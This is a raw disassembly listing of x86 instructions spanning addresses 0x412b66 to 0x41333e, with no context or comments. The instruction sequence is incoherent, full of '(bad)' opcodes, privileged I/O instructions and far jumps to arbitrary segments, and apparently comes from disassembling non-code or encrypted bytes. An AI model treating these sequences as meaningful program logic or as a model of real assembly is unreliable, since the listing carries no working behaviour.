  412b66:	adc    ebx,DWORD PTR [eax+0x6ba5a979]
  412b6c:	rol    DWORD PTR [ebx-0x77878121],0xb2
  412b73:	cmp    eax,0x64295218
  412b78:	out    dx,al
  412b79:	mov    bh,BYTE PTR [esi+0x3ed65a4c]
  412b7f:	test   al,0x10
  412b81:	mov    edx,ss
  412b83:	and    ecx,eax
  412b85:	push   es
  412b86:	cmp    DWORD PTR [edi-0x2c],0xcbfd9c63
  412b8d:	add    dh,BYTE PTR [esp+ecx*8-0x5ab0ddcb]
  412b94:	sub    DWORD PTR [eax-0x72],esi
  412b97:	ins    DWORD PTR es:[edi],dx
  412b98:	pop    edi
  412b99:	push   ebx
  412b9a:	inc    esp
  412b9b:	pop    ecx
  412b9c:	mov    edi,0x359fc136
  412ba1:	inc    ebp
  412ba2:	adc    BYTE PTR [ebp+0x4a],bh
  412ba5:	test   eax,0x61afcd7d
  412baa:	adc    al,0x6c
  412bac:	ret    0x6f9
  412baf:	out    0x42,eax
  412bb1:	scas   eax,DWORD PTR es:[edi]
  412bb2:	push   ds
  412bb3:	inc    edi
  412bb4:	dec    ebx
  412bb5:	jb     0x412b8c
  412bb7:	dec    ax
  412bb9:	icebp  
  412bba:	add    BYTE PTR [ebp+0x4fb4394d],ah
  412bc0:	out    0xf7,eax
  412bc2:	jne    0x412c07
  412bc4:	xchg   edx,eax
  412bc5:	cmp    BYTE PTR [eax+edi*2],bl
  412bc8:	leave  
  412bc9:	fisubr WORD PTR [ecx]
  412bcb:	shr    DWORD PTR [eax-0xf424e5a],cl
  412bd1:	adc    eax,0x7e
  412bd4:	aas    
  412bd5:	sbb    ah,BYTE PTR [ebp+0x8]
  412bd8:	lds    ecx,FWORD PTR [ecx-0x79]
  412bdb:	mov    ds:0xdc7dbedd,eax
  412be0:	jl     0x412c2a
  412be2:	test   DWORD PTR [ebx+0x47daee68],ebp
  412be8:	pop    ebp
  412be9:	dec    edi
  412bea:	push   esi
  412beb:	cmp    eax,0xda6e0748
  412bf0:	pop    eax
  412bf1:	pusha  
  412bf2:	nop
  412bf3:	ror    BYTE PTR [edi-0x58],cl
  412bf6:	ins    BYTE PTR es:[edi],dx
  412bf7:	sub    ah,cl
  412bf9:	xor    al,0x2d
  412bfb:	rcl    BYTE PTR [esp+edi*4+0x6752e48e],1
  412c02:	aam    0x70
  412c04:	ins    BYTE PTR es:[edi],dx
  412c05:	jle    0x412be3
  412c07:	mov    dl,0xab
  412c09:	js     0x412bd8
  412c0b:	jp     0x412c14
  412c0d:	jae    0x412c7a
  412c0f:	mul    BYTE PTR [ebx+0x51]
  412c12:	mov    esp,0xb46f9ee7
  412c17:	mov    ebp,?
  412c19:	cmp    eax,0x6b09f906
  412c1e:	xor    DWORD PTR [ecx],esi
  412c20:	lods   eax,DWORD PTR ds:[esi]
  412c21:	lds    ebx,FWORD PTR [ebx]
  412c23:	(bad)  
  412c24:	sub    ecx,DWORD PTR [esi+0x39]
  412c27:	push   cs
  412c28:	jg     0x412c35
  412c2a:	push   es
  412c2b:	inc    ebx
  412c2c:	dec    esi
  412c2d:	in     al,0x2e
  412c2f:	mov    ch,0x97
  412c31:	cld    
  412c32:	(bad)  
  412c33:	stc    
  412c34:	stc    
  412c35:	pushf  
  412c36:	or     DWORD PTR [edx+ecx*2-0x6],eax
  412c3a:	xor    bl,BYTE PTR [ebp-0x4462383a]
  412c40:	cmp    ch,BYTE PTR [esi+0x6d430034]
  412c46:	xchg   ebx,eax
  412c47:	and    BYTE PTR [edx],0x85
  412c4a:	mov    BYTE PTR [edi],ah
  412c4c:	in     al,0x18
  412c4e:	dec    eax
  412c4f:	daa    
  412c50:	and    bl,ah
  412c52:	adc    DWORD PTR [ebp-0x53],ebp
  412c55:	xor    esi,DWORD PTR [ecx-0x1]
  412c58:	and    DWORD PTR [ebp+0x20],ecx
  412c5b:	mov    edi,0x716510b4
  412c60:	mov    esi,0xae886d2a
  412c65:	dec    ebp
  412c66:	les    ebx,FWORD PTR [edi]
  412c68:	sub    bh,BYTE PTR [esi+ebx*8]
  412c6b:	fwait
  412c6c:	or     ecx,DWORD PTR ds:0xa4d258c
  412c72:	std    
  412c73:	add    BYTE PTR [esi],dl
  412c75:	mov    ebp,0x80673705
  412c7a:	(bad)  
  412c7b:	aad    0x84
  412c7d:	arpl   WORD PTR [esi-0x19],bp
  412c80:	mov    bl,0x3
  412c82:	into   
  412c83:	int3   
  412c84:	cmp    DWORD PTR [ebp-0x4e],edi
  412c87:	loope  0x412c0a
  412c89:	data16 and BYTE PTR ds:0xe5c7d2bb,ch
  412c90:	inc    ebx
  412c91:	cli    
  412c92:	and    BYTE PTR [ecx+0x3a],ah
  412c95:	dec    edx
  412c96:	mov    eax,ds:0x4153febf
  412c9b:	fisub  DWORD PTR es:[esi+0x7b]
  412c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ca0:	js     0x412c40
  412ca2:	data16 cmp BYTE PTR [ebx+0x6eb49faa],0x5f
  412caa:	lods   al,BYTE PTR ds:[esi]
  412cab:	xor    BYTE PTR [eax],al
  412cad:	xchg   bl,ch
  412caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cb0:	mov    dl,0x17
  412cb2:	mov    eax,ds:0xa6c81bb5
  412cb7:	jmp    0xd1fbe53c
  412cbc:	sbb    eax,0x3bf595db
  412cc1:	pop    eax
  412cc2:	pop    ss
  412cc3:	sar    DWORD PTR [esi],cl
  412cc5:	add    ah,BYTE PTR gs:[ecx]
  412cc8:	and    DWORD PTR ds:0x24a58b31,esi
  412cce:	add    BYTE PTR [edx-0x5a8c846d],ah
  412cd4:	and    dh,BYTE PTR [esi]
  412cd6:	call   0xfc8f27ef
  412cdb:	cli    
  412cdc:	inc    edx
  412cdd:	inc    edi
  412cde:	or     ecx,DWORD PTR [edi]
  412ce0:	push   esp
  412ce1:	jle    0x412c9e
  412ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ce4:	retf   0xb4fe
  412ce7:	out    0x51,eax
  412ce9:	imul   eax,DWORD PTR [edi],0xffffffc5
  412cec:	je     0x412d14
  412cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cef:	push   0xffffffe1
  412cf1:	ds sbb al,0x99
  412cf4:	adc    al,al
  412cf6:	mov    bh,0x10
  412cf8:	push   0x46051283
  412cfd:	mov    eax,ds:0x448851e6
  412d02:	sbb    DWORD PTR [eax+0x5c],0xffffff94
  412d06:	xchg   esp,eax
  412d07:	in     eax,0x6
  412d09:	jmp    0xd0213b97
  412d0e:	int    0x5b
  412d10:	(bad)  
  412d11:	dec    ebp
  412d12:	sub    eax,0x59741526
  412d17:	push   es
  412d18:	xchg   ecx,eax
  412d19:	sub    DWORD PTR [ecx-0x2e19b439],ebx
  412d1f:	loop   0x412d63
  412d21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d22:	ins    BYTE PTR es:[edi],dx
  412d23:	fucomp st(1)
  412d25:	data16 jns 0x412cf9
  412d28:	sahf   
  412d29:	outs   dx,BYTE PTR ds:[esi]
  412d2a:	jae    0x412d48
  412d2c:	shl    DWORD PTR [ebx-0x1b5829ca],1
  412d32:	dec    eax
  412d33:	add    bh,BYTE PTR [edx]
  412d35:	fdiv   DWORD PTR [edi+0x25406004]
  412d3b:	adc    esi,DWORD PTR [ecx*4-0x29fdfa3f]
  412d42:	mov    ecx,0x25335060
  412d47:	call   0xa9f7:0x9bf14d19
  412d4e:	jge    0x412dc7
  412d50:	ins    BYTE PTR es:[edi],dx
  412d51:	stos   DWORD PTR es:[edi],eax
  412d52:	xchg   BYTE PTR [edx+0x34917dcd],dl
  412d58:	loopne 0x412d77
  412d5a:	xor    edi,DWORD PTR [edi]
  412d5c:	mov    esp,0x1833fd7b
  412d61:	call   0x8ea621be
  412d66:	add    eax,0x5a5da419
  412d6b:	adc    eax,0xc137951f
  412d70:	dec    ebx
  412d71:	or     DWORD PTR [edx+0x18],esp
  412d74:	enter  0x5d24,0x84
  412d78:	loope  0x412ddf
  412d7a:	mov    cs,WORD PTR [ecx-0x6bca1a14]
  412d80:	xor    DWORD PTR [edi-0x3b05d12e],0xf10c5ca8
  412d8a:	icebp  
  412d8b:	mov    esi,0xcb49e6bf
  412d90:	jp     0x412d6d
  412d92:	lods   al,BYTE PTR ds:[esi]
  412d93:	(bad)  
  412d94:	pop    eax
  412d95:	xchg   ecx,eax
  412d96:	in     al,dx
  412d97:	push   0xffffff94
  412d99:	jecxz  0x412d99
  412d9b:	data16 mov cl,0x6
  412d9e:	into   
  412d9f:	pop    ebp
  412da0:	es enter 0x54c5,0xb7
  412da5:	(bad)  
  412da6:	push   eax
  412da7:	bound  ecx,QWORD PTR [edi-0x65]
  412daa:	aad    0x26
  412dac:	loope  0x412daf
  412dae:	xchg   ecx,eax
  412daf:	mov    esi,0x4600f258
  412db4:	je     0x412e09
  412db6:	out    0x30,eax
  412db8:	and    ebp,DWORD PTR [edx]
  412dba:	push   edi
  412dbb:	(bad)  
  412dbc:	or     DWORD PTR [ebx],edi
  412dbe:	mov    ebx,0xd9a5b923
  412dc3:	xchg   esp,eax
  412dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dc5:	cmp    al,0x6a
  412dc7:	adc    al,0xa0
  412dc9:	pop    es
  412dca:	test   BYTE PTR fs:[eax],ah
  412dcd:	xchg   ebp,eax
  412dce:	retf   
  412dcf:	outs   dx,BYTE PTR ds:[esi]
  412dd0:	mov    al,0xf
  412dd2:	sbb    eax,0x98e0bfd1
  412dd7:	shl    ah,0x8f
  412dda:	mov    ebp,DWORD PTR [edx*2+0x6b63a12e]
  412de1:	xchg   ecx,eax
  412de2:	icebp  
  412de3:	fild   DWORD PTR [esi+eiz*8]
  412de6:	mov    esi,0xb6918cf2
  412deb:	dec    esp
  412dec:	mov    esi,cs
  412dee:	ds xchg edx,eax
  412df0:	adc    DWORD PTR [esi-0x3454ad5d],esi
  412df6:	sbb    bl,bh
  412df8:	call   0xf0b7:0xc4c15bde
  412dff:	ins    BYTE PTR es:[edi],dx
  412e00:	or     DWORD PTR [ecx-0x7040936e],edx
  412e06:	retf   0x254b
  412e09:	daa    
  412e0a:	(bad)  
  412e0b:	out    dx,al
  412e0c:	or     eax,0x570d2614
  412e11:	ins    BYTE PTR es:[edi],dx
  412e12:	scas   eax,DWORD PTR es:[edi]
  412e13:	and    DWORD PTR [esi],esp
  412e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e16:	test   al,0x6a
  412e18:	in     eax,dx
  412e19:	and    DWORD PTR [esi-0x53],edx
  412e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e1d:	neg    BYTE PTR [esi-0x6ddefdd9]
  412e23:	ds mov eax,0x75b1b7c8
  412e29:	dec    esi
  412e2a:	sub    BYTE PTR [edi-0x5d],dl
  412e2d:	inc    ebp
  412e2e:	loope  0x412ea2
  412e30:	fs or  ch,ch
  412e33:	jbe    0x412df4
  412e35:	mov    eax,0xe55148d
  412e3a:	sub    al,0x75
  412e3c:	les    esi,FWORD PTR [ecx+0x169bf34d]
  412e42:	xchg   ebx,eax
  412e43:	pop    ss
  412e44:	lahf   
  412e45:	loope  0x412dfe
  412e47:	xchg   ebx,eax
  412e48:	mov    ds:0x7b020558,al
  412e4d:	inc    ebx
  412e4e:	push   edi
  412e4f:	and    bh,bh
  412e51:	mov    eax,0x46e11fa9
  412e56:	ret    0x249a
  412e59:	push   ds
  412e5a:	jb     0x412e00
  412e5c:	jge    0x412e8a
  412e5e:	mov    gs,eax
  412e60:	arpl   WORD PTR [eax],si
  412e62:	arpl   sp,dx
  412e64:	test   ah,al
  412e66:	inc    eax
  412e67:	cmp    dl,BYTE PTR [edx-0x6f]
  412e6a:	or     ecx,DWORD PTR [ecx-0x32]
  412e6d:	pop    ebp
  412e6e:	lock push ss
  412e70:	sub    DWORD PTR [edx+0x6ff43ec7],edx
  412e76:	cmp    eax,0x7b622d33
  412e7b:	icebp  
  412e7c:	xchg   esp,eax
  412e7d:	cdq    
  412e7e:	fld    DWORD PTR [edx+0x6d67099e]
  412e84:	push   ss
  412e85:	xchg   ecx,eax
  412e86:	lahf   
  412e87:	push   0x39
  412e89:	inc    esp
  412e8a:	je     0x412ec9
  412e8c:	inc    eax
  412e8d:	aaa    
  412e8e:	in     al,0xd7
  412e90:	imul   edi,DWORD PTR [ecx+0x6461dde],0xef1047f
  412e9a:	lea    eax,ds:0xa7a6f239
  412ea0:	and    esi,DWORD PTR [edx-0x75]
  412ea3:	adc    DWORD PTR [esi],eax
  412ea5:	dec    esi
  412ea6:	jno    0x412e96
  412ea8:	push   esi
  412ea9:	xor    eax,eax
  412eab:	pop    edx
  412eac:	or     ah,dh
  412eae:	retf   
  412eaf:	jnp    0x412ee4
  412eb1:	jno    0x412eb2
  412eb3:	ret    0x2ea2
  412eb6:	xlat   BYTE PTR ds:[ebx]
  412eb7:	neg    DWORD PTR [ebp-0x5]
  412eba:	fst    DWORD PTR [eax+0x65]
  412ebd:	lds    ecx,FWORD PTR [ebx+0x6d]
  412ec0:	mov    esi,0xcc762668
  412ec5:	mov    BYTE PTR [ecx+0x8cb520f],bl
  412ecb:	xchg   edx,eax
  412ecc:	inc    esp
  412ecd:	xchg   edi,eax
  412ece:	fidiv  DWORD PTR [edx-0x5acb081a]
  412ed4:	pop    edi
  412ed5:	pop    ss
  412ed6:	pop    eax
  412ed7:	add    al,0xbc
  412ed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eda:	add    ebx,ebp
  412edc:	hlt    
  412edd:	fstp   QWORD PTR [eax-0x17babe39]
  412ee3:	into   
  412ee4:	sub    edi,esp
  412ee6:	(bad)  
  412ee7:	out    0x4b,al
  412ee9:	ds mov cr1,edx
  412eed:	mov    edi,0xbd60eda8
  412ef2:	and    ah,BYTE PTR ds:0x93cc9371
  412ef8:	dec    esp
  412ef9:	mov    eax,ds:0x359fb8e
  412efe:	mov    dl,0xeb
  412f00:	fs mov esp,0x59136c50
  412f06:	and    BYTE PTR [edx-0x1fed17c9],0xbb
  412f0d:	push   edi
  412f0e:	hlt    
  412f0f:	test   eax,0x7e8d230
  412f14:	repnz xchg ebx,eax
  412f16:	stc    
  412f17:	(bad)  
  412f18:	rol    DWORD PTR [edx-0x62],0x72
  412f1c:	sar    BYTE PTR [eax],0x33
  412f1f:	out    dx,eax
  412f20:	int3   
  412f21:	push   ds
  412f22:	fiadd  DWORD PTR [ebp+0x1ae8f9e6]
  412f28:	sbb    eax,DWORD PTR [eax-0x19]
  412f2b:	mov    al,0x4c
  412f2d:	xor    al,0xd4
  412f2f:	or     DWORD PTR [eax-0x2b],ebp
  412f32:	arpl   bp,bx
  412f34:	or     BYTE PTR [esi-0x1b638089],ah
  412f3a:	std    
  412f3b:	test   DWORD PTR [ecx+0x59b13453],ecx
  412f41:	pop    ss
  412f42:	daa    
  412f43:	je     0x412f26
  412f45:	mov    cs,esi
  412f47:	or     BYTE PTR [esi+ebp*1-0x29974fab],bh
  412f4e:	add    esp,DWORD PTR [ecx-0x7a]
  412f51:	stc    
  412f52:	lea    ebx,[edx-0x62]
  412f55:	mov    edi,0x3e87ec0f
  412f5a:	push   esp
  412f5b:	inc    ebp
  412f5c:	lock dec edx
  412f5e:	push   ebx
  412f5f:	ds pop ss
  412f61:	cmp    DWORD PTR [ecx],ebx
  412f63:	fcom   QWORD PTR [edi+0x6cfd6961]
  412f69:	pop    edx
  412f6a:	push   es
  412f6b:	sub    dh,BYTE PTR [edi-0x38a3546b]
  412f71:	mov    ah,0x88
  412f73:	pop    ecx
  412f74:	dec    edx
  412f75:	jl     0x412f66
  412f77:	inc    ecx
  412f78:	xchg   edi,esi
  412f7a:	adc    DWORD PTR [ebp-0x295d434e],0x57
  412f81:	inc    ecx
  412f82:	jb     0x412f1a
  412f84:	inc    edi
  412f85:	fucomi st,st(4)
  412f88:	cmc    
  412f89:	and    BYTE PTR [ebp+0x74],dh
  412f8c:	push   esp
  412f8d:	jo     0x412f36
  412f8f:	jmp    0x412fcf
  412f91:	mul    BYTE PTR [esp+ebp*1]
  412f94:	pop    edx
  412f95:	mov    ecx,0xabbaa629
  412f9a:	js     0x413017
  412f9c:	xchg   BYTE PTR [esi+eax*2+0x7],cl
  412fa0:	cld    
  412fa1:	sub    ch,dh
  412fa3:	adc    al,0xe6
  412fa5:	sub    eax,0xadcc407
  412faa:	push   ecx
  412fab:	or     BYTE PTR [eax+0x78],cl
  412fae:	call   0x130be0d6
  412fb3:	jecxz  0x412f87
  412fb5:	outs   dx,DWORD PTR ds:[esi]
  412fb6:	lahf   
  412fb7:	jae    0x412f7d
  412fb9:	cld    
  412fba:	mov    edi,0xbd74f574
  412fbf:	imul   esp,DWORD PTR [edx+0xd],0x547b11d7
  412fc6:	xor    BYTE PTR [ebp+0x2d],0x5a
  412fca:	enter  0x8f83,0xd4
  412fce:	addr16 enter 0xfd37,0x1b
  412fd3:	retf   
  412fd4:	pop    esi
  412fd5:	into   
  412fd6:	hlt    
  412fd7:	pop    es
  412fd8:	dec    edi
  412fd9:	repnz cmp eax,0x8d256dc0
  412fdf:	imul   ebp,DWORD PTR [ebx+0x28],0x58e743b8
  412fe6:	jmp    0x95ec:0x88fff67c
  412fed:	xchg   esp,eax
  412fee:	in     eax,0xc5
  412ff0:	and    bh,BYTE PTR [edx-0x57122eca]
  412ff6:	stos   DWORD PTR es:[edi],eax
  412ff7:	sub    BYTE PTR [esi],0xc
  412ffa:	inc    edi
  412ffb:	add    eax,edx
  412ffd:	sbb    eax,esi
  412fff:	push   0x7f
  413001:	pop    ebx
  413002:	or     cl,BYTE PTR [ebp+0x2ced9779]
  413008:	fwait
  413009:	popf   
  41300a:	not    DWORD PTR [edx-0x74e53330]
  413010:	mov    dh,0xca
  413012:	hlt    
  413013:	jns    0x41304c
  413015:	andps  xmm6,xmm2
  413018:	js     0x413073
  41301a:	xor    eax,0x48adf2a2
  41301f:	xchg   ecx,eax
  413020:	cmp    dl,bh
  413022:	xchg   ebx,eax
  413023:	mov    al,ds:0x4fca1ad0
  413028:	inc    ebp
  413029:	iret   
  41302a:	fstp   DWORD PTR [ecx]
  41302c:	fbstp  TBYTE PTR [edx+eiz*1-0x27]
  413030:	pop    ebx
  413031:	into   
  413032:	fmulp  st(2),st
  413034:	bound  edx,QWORD PTR [eax+0x73f67201]
  41303a:	test   BYTE PTR [esi-0x34],bl
  41303d:	ficomp WORD PTR [esi-0x64]
  413040:	mov    ds:0xbd3305df,eax
  413045:	and    DWORD PTR [esi-0x73],ebp
  413048:	adc    edx,DWORD PTR [edx]
  41304a:	rcl    DWORD PTR [edx+eax*4+0x62],cl
  41304e:	mov    eax,0x35d42f03
  413053:	cmp    ah,BYTE PTR [edx-0x48]
  413056:	push   ds
  413057:	addr16 sub al,0xf3
  41305a:	jne    0x4130ca
  41305c:	sti    
  41305d:	fistp  QWORD PTR [edi+0x21]
  413060:	xchg   DWORD PTR [ebx],edx
  413062:	std    
  413063:	fs call 0x85b2:0x6d6ad80f
  41306b:	pop    ebp
  41306c:	(bad)  
  41306d:	sbb    BYTE PTR [ebp-0x57e7994d],al
  413073:	pushf  
  413074:	and    bh,ah
  413076:	add    al,0xeb
  413078:	ja     0x4130c7
  41307a:	cmp    al,bh
  41307c:	rol    ah,cl
  41307e:	es std 
  413080:	jae    0x413047
  413082:	das    
  413083:	dec    edx
  413084:	push   ebp
  413085:	adc    esp,DWORD PTR ds:0xd4cf4d87
  41308b:	mov    ebx,ebp
  41308d:	pusha  
  41308e:	loop   0x413088
  413090:	adc    edx,ebp
  413092:	aad    0xdd
  413094:	push   ecx
  413095:	mov    ch,0x7d
  413097:	xchg   esp,eax
  413098:	mov    ds:0x734a159b,al
  41309d:	lahf   
  41309e:	out    dx,al
  41309f:	js     0x4130dd
  4130a1:	mov    esi,0xcbd89af7
  4130a6:	leave  
  4130a7:	mov    ebx,0x1faefdbb
  4130ac:	mov    ecx,0xa006fcba
  4130b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130b2:	xchg   edi,eax
  4130b3:	lods   al,BYTE PTR ds:[esi]
  4130b4:	call   0x923f:0xd64b85a2
  4130bb:	xor    DWORD PTR [ebp-0x51618f72],edx
  4130c1:	aas    
  4130c2:	xlat   BYTE PTR ds:[ebx]
  4130c3:	mov    ds:0x1f2c2314,al
  4130c8:	fiadd  DWORD PTR [ebx-0x16f5fce0]
  4130ce:	fcom   DWORD PTR [esi-0x57]
  4130d1:	pop    ebx
  4130d2:	shld   DWORD PTR [edx-0x39],eax,0x2f
  4130d7:	leave  
  4130d8:	inc    ebp
  4130d9:	call   0x37d6874e
  4130de:	fiadd  WORD PTR [eax]
  4130e0:	pop    ecx
  4130e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130e2:	out    dx,eax
  4130e3:	xchg   BYTE PTR [ebp+0x41f2e2e1],cl
  4130e9:	adc    al,0xdd
  4130eb:	daa    
  4130ec:	pop    ebx
  4130ed:	cmp    BYTE PTR cs:[ecx+0x29],dl
  4130f1:	add    BYTE PTR [ebx],ch
  4130f3:	jnp    0x413138
  4130f5:	ss out 0x15,eax
  4130f8:	loope  0x41311c
  4130fa:	in     al,dx
  4130fb:	sti    
  4130fc:	cdq    
  4130fd:	mov    cl,0x58
  4130ff:	xor    dh,BYTE PTR [esi-0x6a59858d]
  413105:	push   0xffffffd5
  413107:	loopne 0x413111
  413109:	les    esi,FWORD PTR [ebp-0x57bf406]
  41310f:	in     eax,dx
  413110:	hlt    
  413111:	jno    0x4130f9
  413113:	xor    ah,cl
  413115:	retf   
  413116:	or     ecx,DWORD PTR ds:0xc4077aed
  41311c:	adc    al,0xee
  41311e:	mov    bl,0xd8
  413120:	push   cs
  413121:	inc    eax
  413122:	loop   0x413117
  413124:	fwait
  413125:	jb     0x413188
  413127:	fadd   DWORD PTR [ecx+0x7c91463b]
  41312d:	dec    ecx
  41312e:	shl    DWORD PTR [edx-0x68],0x18
  413132:	inc    esp
  413133:	fiadd  DWORD PTR ds:0x35cd4e62
  413139:	xchg   DWORD PTR [edx-0x76],ebx
  41313c:	xchg   ebp,eax
  41313d:	imul   esp,DWORD PTR [edi+0x51],0x97694b56
  413144:	ds mov al,0x79
  413147:	push   ss
  413148:	or     al,0x55
  41314a:	fs pop ebp
  41314c:	int    0x59
  41314e:	prefetch BYTE PTR [ebp+0x28]
  413152:	push   esi
  413153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413154:	lock std 
  413156:	jl     0x413195
  413158:	loopne 0x41315e
  41315a:	mov    ds:0x2c7d3293,eax
  41315f:	sahf   
  413160:	dec    edx
  413161:	shl    BYTE PTR [ebp-0x5224cdc0],1
  413167:	(bad)  
  413168:	pop    edi
  413169:	sbb    esp,esi
  41316b:	dec    eax
  41316c:	fsubr  st(1),st
  41316e:	pushf  
  41316f:	sbb    eax,DWORD PTR [ecx-0x55127e17]
  413175:	lods   al,BYTE PTR ds:[esi]
  413176:	leave  
  413177:	xchg   ebx,eax
  413178:	jb     0x4131c0
  41317a:	cli    
  41317b:	adc    al,0x40
  41317d:	loopne 0x4131d4
  41317f:	cmp    edi,esp
  413181:	mov    edi,0x45727986
  413186:	add    cl,BYTE PTR [eax-0x33a88e71]
  41318c:	int    0x5b
  41318e:	add    al,0xae
  413190:	xor    ah,ch
  413192:	call   DWORD PTR [edx+0x14083cbc]
  413198:	pop    es
  413199:	ss test cl,cl
  41319c:	cmc    
  41319d:	adc    edi,ebp
  41319f:	add    ebx,DWORD PTR [edx]
  4131a1:	ja     0x4131ff
  4131a3:	inc    ebp
  4131a4:	fild   WORD PTR [edi-0x49354ce3]
  4131aa:	stc    
  4131ab:	retf   
  4131ac:	in     eax,dx
  4131ad:	shl    BYTE PTR [esi+ecx*2-0x28],1
  4131b1:	int3   
  4131b2:	clc    
  4131b3:	jns    0x41322c
  4131b5:	pop    ds
  4131b6:	mov    ch,0x40
  4131b8:	arpl   WORD PTR [ecx-0x23eb7090],dx
  4131be:	arpl   WORD PTR [eax+0x75d26b71],dx
  4131c4:	dec    esi
  4131c5:	inc    eax
  4131c6:	mov    BYTE PTR [edi],bh
  4131c8:	cmp    bh,BYTE PTR [bx]
  4131cb:	or     edx,DWORD PTR [esi-0x6f2f505b]
  4131d1:	imul   ebx,DWORD PTR [edx+0x465883cd],0x1c
  4131d8:	adc    ebp,esp
  4131da:	fstp   DWORD PTR [eax+0x31]
  4131dd:	adc    BYTE PTR [ecx-0x53b45148],dh
  4131e3:	fstp   DWORD PTR ss:[ecx+0x3f]
  4131e7:	or     al,BYTE PTR [edi+0x3913dcd8]
  4131ed:	push   edx
  4131ee:	inc    ebp
  4131ef:	(bad)  
  4131f0:	xlat   BYTE PTR ds:[ebx]
  4131f1:	into   
  4131f2:	push   eax
  4131f3:	cli    
  4131f4:	cld    
  4131f5:	nop
  4131f6:	icebp  
  4131f7:	xchg   edi,eax
  4131f8:	cdq    
  4131f9:	sbb    BYTE PTR [edi-0x6],ch
  4131fc:	daa    
  4131fd:	push   ss
  4131fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ff:	sub    DWORD PTR [eax],eax
  413201:	mov    al,BYTE PTR ds:0x85c174de
  413207:	arpl   WORD PTR [edi+ecx*1-0x54776dce],cx
  41320e:	stc    
  41320f:	jle    0x413285
  413211:	inc    ebp
  413212:	cmp    ah,BYTE PTR [ebp-0x50]
  413215:	cwde   
  413216:	dec    esp
  413217:	adc    al,0x7a
  413219:	sbb    eax,0x5c15cd69
  41321e:	xchg   esi,eax
  41321f:	aad    0x31
  413221:	mov    cl,0x0
  413223:	sub    ebp,DWORD PTR [edi+0x7d]
  413226:	ret    
  413227:	sub    al,BYTE PTR [edi-0x1e]
  41322a:	push   ss
  41322b:	push   0xb30662cf
  413230:	retf   
  413231:	aas    
  413232:	jp     0x413220
  413234:	mov    dh,0xe6
  413236:	inc    edi
  413237:	retf   0xdddf
  41323a:	jnp    0x4131dc
  41323c:	rcl    BYTE PTR [esi-0x36f1c33f],cl
  413242:	clc    
  413243:	jae    0x413208
  413245:	jge    0x41322d
  413247:	xchg   BYTE PTR [eax-0x55],ch
  41324a:	lds    edi,FWORD PTR [ebx-0x4aca0d97]
  413250:	and    dh,BYTE PTR ds:0xa8479575
  413256:	stos   BYTE PTR es:[edi],al
  413257:	or     esi,DWORD PTR [eax]
  413259:	hlt    
  41325a:	imul   eax,esp,0xffffff9e
  41325d:	add    BYTE PTR [ebx+0x18],dl
  413260:	xor    eax,DWORD PTR [ecx+0x36]
  413263:	js     0x4132d4
  413265:	push   edx
  413266:	stc    
  413267:	aam    0x23
  413269:	adc    ah,BYTE PTR [ebx-0x40f85ace]
  41326f:	jb     0x4132b0
  413271:	mov    dh,0x80
  413273:	mov    edx,0x2d5280bb
  413278:	aas    
  413279:	dec    edx
  41327a:	xor    eax,0x41ac0b9d
  41327f:	mov    eax,0x9b8fa280
  413284:	fwait
  413285:	pop    ss
  413286:	pop    eax
  413287:	gs or  al,0xd4
  41328a:	fidivr DWORD PTR [esi+0xc]
  41328d:	mov    dh,0xde
  41328f:	fnstsw WORD PTR [edi]
  413291:	cld    
  413292:	jo     0x4132c9
  413294:	mov    esi,0xbd883705
  413299:	push   ebp
  41329a:	sbb    eax,0x5b5015fa
  41329f:	inc    ecx
  4132a0:	push   ebp
  4132a1:	mov    cl,0x2b
  4132a3:	dec    ebx
  4132a4:	jp     0x4132d6
  4132a6:	scas   eax,DWORD PTR es:[edi]
  4132a7:	test   eax,0x9ff6d243
  4132ac:	sbb    eax,0x16d4fe26
  4132b1:	dec    ebx
  4132b2:	push   esi
  4132b3:	add    ecx,ebx
  4132b5:	xchg   ebp,eax
  4132b6:	lahf   
  4132b7:	loop   0x413293
  4132b9:	bound  ecx,QWORD PTR [ebx+0x57c5ff99]
  4132bf:	push   edx
  4132c0:	dec    esi
  4132c1:	jl     0x413311
  4132c3:	in     al,dx
  4132c4:	(bad)  
  4132c5:	cmp    BYTE PTR [ebx-0x36],cl
  4132c8:	mov    ecx,0x6385cff4
  4132cd:	xchg   DWORD PTR [ecx-0x67],eax
  4132d0:	neg    DWORD PTR ds:0x65861949
  4132d6:	sbb    ecx,DWORD PTR [ebp-0x71befa7]
  4132dc:	mov    eax,0x874fc926
  4132e1:	and    BYTE PTR [esi-0x6410a025],0x39
  4132e8:	fnstsw WORD PTR [eax]
  4132ea:	imul   edi,esi,0x7b859071
  4132f0:	jmp    0xe096:0x24d2bfa7
  4132f7:	xchg   ecx,eax
  4132f8:	cmovno ecx,edx
  4132fb:	jg     0x41332e
  4132fd:	aad    0x95
  4132ff:	jae    0x41334b
  413301:	imul   ebx,DWORD PTR [eax],0x12
  413304:	das    
  413305:	outs   dx,DWORD PTR ds:[esi]
  413306:	push   0x6d030a01
  41330b:	pop    DWORD PTR [edx]
  41330d:	sub    BYTE PTR [ecx+0x3],bl
  413310:	mov    eax,ds:0x9d6bbd1d
  413315:	mov    edi,0xd47abf9e
  41331a:	or     BYTE PTR [ebp-0x10fe0e22],dh
  413320:	push   0x663cd2f0
  413325:	scas   eax,DWORD PTR es:[edi]
  413326:	sbb    dh,al
  413328:	js     0x413322
  41332a:	mov    ss,WORD PTR [ecx]
  41332c:	add    ebx,edi
  41332e:	jg     0x4133a6
  413330:	lds    esi,FWORD PTR [edx-0x28b24818]
  413336:	outs   dx,BYTE PTR ds:[esi]
  413337:	jo     0x413338
  413339:	(bad)  
  41333a:	xchg   ecx,eax
  41333b:	mov    dh,0x7b
  41333d:	lods   eax,DWORD PTR ds:[esi]
  41333e:	mov    cl,0xba
